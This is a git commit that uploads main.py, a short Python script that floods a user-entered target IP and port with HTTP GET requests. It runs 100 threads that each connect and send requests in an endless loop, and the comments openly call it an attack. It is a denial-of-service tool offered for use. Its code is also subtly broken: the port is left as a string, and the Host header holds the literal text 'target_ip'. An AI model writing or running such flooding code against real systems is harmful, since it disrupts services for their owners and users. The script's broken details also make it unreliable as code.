34ab7192556943d361702ef38582254991e905ce
Hertz <106058099+yuhertz@users.noreply.github.com>
2026-05-14 14:16:47 +0800

    Add files via upload

---
+++ main.py
@@ -0,0 +1,23 @@
+import socket
+import threading
+
+# Define the target IP address and port
+target_ip = input("Enter target ip: ")
+target_port = input("Enter target port: ")
+
+# Function to perform the attack
+def attack():
+    while True:
+        # Create a socket object
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        # Connect to the target
+        s.connect((target_ip, target_port))
+        # Send a simple HTTP GET request
+        s.sendto(b"GET / HTTP/1.1\r\nHost: target_ip\r\n\r\n", (target_ip, target_port))
+        # Close the socket
+        s.close()
+
+# Create multiple threads to simulate multiple attackers
+for i in range(100):  # Number of threads
+    thread = threading.Thread(target=attack)
+    thread.start()
